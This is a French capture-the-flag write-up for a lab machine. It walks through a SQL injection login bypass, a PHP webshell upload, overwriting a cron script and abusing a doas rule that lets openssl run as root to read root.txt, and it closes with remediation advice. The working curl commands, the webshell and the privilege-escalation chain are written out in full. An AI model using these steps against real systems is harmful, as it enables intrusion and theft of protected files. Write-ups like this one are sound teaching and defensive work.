Daemon Slayer #2

Catégorie : Élévation de privilèges (doas + GTFOBins openssl → root) Cible : 10.10.0.4 (suite de Daemon Slayer — muzan → root) Objectif : Lire root.txt Flag : EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}

Objectif

Suite directe de Daemon Slayer #1, sur la même machine. On dispose déjà d'une RCE en tant que www-data (via le webshell) et d'un cron qui tourne chaque minute en tant que muzan. Le but est d'atteindre root en exploitant une règle doas mal configurée qui autorise muzan à lancer openssl en root.

Le vrai défi technique : contourner le piège ruid vs euid (un shell SUID ne suffit pas pour doas).

1. Rétablissement du point de départ (RCE www-data)

La machine ayant redémarré, on rejoue la chaîne du #1 pour retrouver le foothold :

bash
IP=10.10.0.4

# bypass SQLi → cookie admin
curl -s -c cookies.txt -X POST "http://$IP:445/upper/classes/Login.php?f=login" \
  --data-urlencode "username=' OR '1'='1' -- -" --data-urlencode "password=x"   # {"status":"success"}

# re-upload du webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -b cookies.txt -X POST "http://$IP:445/upper/classes/Users.php?f=save" \
  -F "id=" -F "firstname=test" -F "lastname=test" \
  -F "username=pwntest$(date +%s)" -F "password=test123" -F "img=@shell.php"   # 1

# retrouver le nouveau chemin
curl -s -b cookies.txt "http://$IP:445/upper/admin/?page=user/list" | grep -i uploads
# → /upper/uploads/1790435400_shell.php

SHELL="http://$IP:445/upper/uploads/1790435400_shell.php"
curl -s "$SHELL?cmd=id"   # uid=33(www-data)

Cron toujours actif :

bash
curl -s -G "$SHELL" --data-urlencode "cmd=cat /etc/crontab"
# * * * * * muzan /var/www/scripts/immortality_check.sh

Le dossier /var/www/scripts/ appartient à www-data → on peut remplacer le script à volonté (cf. Daemon Slayer #1).

2. Le piège ruid vs euid (pourquoi un shell SUID ne suffit pas)

Une première approche naïve serait de copier /bin/bash en SUID via le cron pour obtenir un shell muzan (bash -p). Elle donnerait :

uid=33(www-data) gid=33(www-data) euid=1000(muzan) egid=1000(muzan) groups=1000(muzan),33(www-data)

Point crucial : bash -p sur un binaire SUID ne change que l'euid (effective UID = identité utilisée pour les vérifications de droits sur les fichiers), pas le ruid (real UID = identité « réelle » du processus).

Or doas (comme sudo) vérifie le ruid du processus appelant. Depuis ce shell, ruid = www-data → doas refuserait, même avec euid = muzan. Un shell SUID est donc insuffisant pour exploiter doas.

La solution consiste à faire partir l'appel doas depuis le cron lui-même, qui est lancé nativement par le système en tant que muzan → ruid = euid = muzan.

3. Découverte de la faille — doas
3.1 Binaires SUID du système
bash
curl -s -G "$SHELL" --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/doas      ← anomalie : doas n'est pas installé par défaut sur Debian
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4

/usr/bin/doas (alternative légère à sudo, issue d'OpenBSD) est présent alors qu'il n'est pas standard sur Debian → piste intentionnelle.

3.2 Lecture de la config doas
bash
curl -s -G "$SHELL" --data-urlencode "cmd=cat /etc/doas.conf"
permit nopass muzan as root cmd openssl

Vulnérabilité : muzan peut exécuter openssl en tant que root, sans mot de passe.

permit = autorise
nopass = sans mot de passe
muzan = l'utilisateur autorisé
as root = avec les privilèges root
cmd openssl = uniquement la commande openssl

Or openssl est répertorié sur GTFOBins comme vecteur de lecture de fichiers arbitraires. openssl enc -in <fichier> recopie le contenu d'un fichier (un cat déguisé). Exécuté en root, cela permet de lire n'importe quel fichier, dont /root/root.txt ou /etc/shadow. Autoriser un binaire polyvalent en root sans restriction ≈ accès root complet.

4. Exploitation via le cron (contournement ruid/euid)

On ne peut pas lancer doas depuis le webshell (ruid = www-data → refus). On injecte donc l'appel doas dans le script du cron, exécuté nativement en tant que muzan (ruid = muzan → doas accepte).

bash
curl -s -G "$SHELL" --data-urlencode "cmd=rm /var/www/scripts/immortality_check.sh"
curl -s -G "$SHELL" --data-urlencode "cmd=echo '#!/bin/bash' > /var/www/scripts/immortality_check.sh"
curl -s -G "$SHELL" --data-urlencode "cmd=echo 'doas openssl enc -in /root/root.txt -out /tmp/root.txt' >> /var/www/scripts/immortality_check.sh"
curl -s -G "$SHELL" --data-urlencode "cmd=echo 'chmod 666 /tmp/root.txt' >> /var/www/scripts/immortality_check.sh"
curl -s -G "$SHELL" --data-urlencode "cmd=chmod +x /var/www/scripts/immortality_check.sh"

Contenu du script (vérification) :

bash
curl -s -G "$SHELL" --data-urlencode "cmd=cat /var/www/scripts/immortality_check.sh"
#!/bin/bash
doas openssl enc -in /root/root.txt -out /tmp/root.txt
chmod 666 /tmp/root.txt

Explication ligne par ligne :

doas openssl enc -in /root/root.txt -out /tmp/root.txt : lancé par le cron (ruid = muzan) → doas accepte → openssl enc recopie /root/root.txt (lisible root uniquement) vers /tmp/root.txt, en root.
chmod 666 /tmp/root.txt : rend la copie lisible par tous, donc par www-data.

Pourquoi ça marche maintenant : le processus qui appelle doas est le cron, lancé nativement par le système avec l'identité complète de muzan (ruid = euid = muzan). Aucun décalage ruid/euid → doas accepte.

Attente et récupération
bash
sleep 65
curl -s -G "$SHELL" --data-urlencode "cmd=cat /tmp/root.txt"
EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}
5. Concepts clés à retenir
Concept	Explication
ruid vs euid	bash -p (SUID) ne change que l'euid ; sudo/doas vérifient le ruid → shell SUID insuffisant.
Contexte d'exécution	Un cron s'exécute avec l'identité réelle complète de l'utilisateur (ruid = euid) → contourne le piège ruid/euid.
doas	Équivalent OpenBSD de sudo ; /etc/doas.conf définit les règles (permit nopass ... cmd ...).
GTFOBins (openssl)	openssl enc -in fichier = lecture arbitraire de fichier avec les droits accordés.
Binaire polyvalent	Autoriser openssl/vim/less/find en root sans restriction ≈ root complet.
6. Recommandations de remédiation
doas/sudo : ne jamais autoriser un binaire polyvalent (openssl, vim, less, find...) sans restreindre précisément la commande et ses arguments.
Permissions cron : le dossier d'un script exécuté par un cron privilégié doit appartenir au même utilisateur, en 750 ou moins, jamais inscriptible par un utilisateur de moindre privilège.
Moindre privilège : accorder nopass sur un binaire capable de lire/écrire des fichiers arbitraires équivaut à un accès root complet.
7. Résumé de la chaîne d'attaque
RCE www-data + cron muzan (hérités du #1)
   → SUID bash (euid=muzan, mais ruid=www-data → doas refuse)
   → find -perm -4000 → /usr/bin/doas
   → /etc/doas.conf : permit nopass muzan as root cmd openssl
   → doas openssl DANS le cron (ruid=muzan réel) → lecture root.txt → FLAG
Étape	Technique	Résultat
1	Rappel : RCE www-data + cron muzan	point de départ
2	Analyse ruid/euid (shell SUID insuffisant)	doas refuse depuis un shell SUID
3	find -perm -4000 + lecture /etc/doas.conf	muzan autorisé à lancer openssl en root sans mdp
4	GTFOBins openssl enc via le cron	lecture de /root/root.txt en root → FLAG